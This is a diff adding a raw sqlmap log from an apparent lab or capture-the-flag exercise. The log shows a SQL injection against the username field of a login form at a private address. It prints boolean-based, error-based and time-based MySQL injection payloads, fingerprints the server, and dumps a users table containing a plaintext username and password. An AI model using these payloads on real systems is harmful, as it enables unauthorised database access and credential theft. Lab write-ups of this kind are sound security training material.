@@ -1,0 +1,69 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:08:46 /2022-07-05/
+
+[16:08:46] [INFO] testing connection to the target URL
+[16:08:46] [INFO] searching for forms
+[1/1] Form:
+POST http://10.10.43.131/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> 
+Edit POST data [default: username=&password=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] 
+[16:08:49] [INFO] resuming back-end DBMS 'mysql' 
+[16:08:49] [INFO] using '/home/divu050704/.local/share/sqlmap/output/results-07052022_0408pm.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=IlaN' RLIKE (SELECT (CASE WHEN (2211=2211) THEN 0x496c614e ELSE 0x28 END))-- wXOt&password=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: username=IlaN' AND GTID_SUBSET(CONCAT(0x7171717a71,(SELECT (ELT(4472=4472,1))),0x716a707a71),4472)-- LNDm&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=IlaN' AND (SELECT 2273 FROM (SELECT(SLEEP(5)))DjPA)-- CTTD&password=
+---
+do you want to exploit this SQL injection? [Y/n] 
+[16:08:50] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[16:08:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[16:08:50] [INFO] fetching current database
+[16:08:50] [INFO] resumed: 'users'
+[16:08:50] [INFO] fetching tables for database: 'users'
+[16:08:50] [INFO] resumed: 'users'
+[16:08:50] [INFO] fetching columns for table 'users' in database 'users'
+[16:08:50] [INFO] resumed: 'username'
+[16:08:50] [INFO] resumed: 'varchar(100)'
+[16:08:50] [INFO] resumed: 'password'
+[16:08:50] [INFO] resumed: 'varchar(100)'
+[16:08:50] [INFO] fetching entries for table 'users' in database 'users'
+[16:08:50] [INFO] resumed: 'secretpass'
+[16:08:50] [INFO] resumed: 'pingudad'
+Database: users
+Table: users
+[1 entry]
++------------+----------+
+| password   | username |
++------------+----------+
+| secretpass | pingudad |
++------------+----------+
+
+[16:08:50] [INFO] table 'users.users' dumped to CSV file '/home/divu050704/.local/share/sqlmap/output/10.10.43.131/dump/users/users.csv'
+[16:08:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/divu050704/.local/share/sqlmap/output/results-07052022_0408pm.csv'
+
+[*] ending @ 16:08:50 /2022-07-05/
+
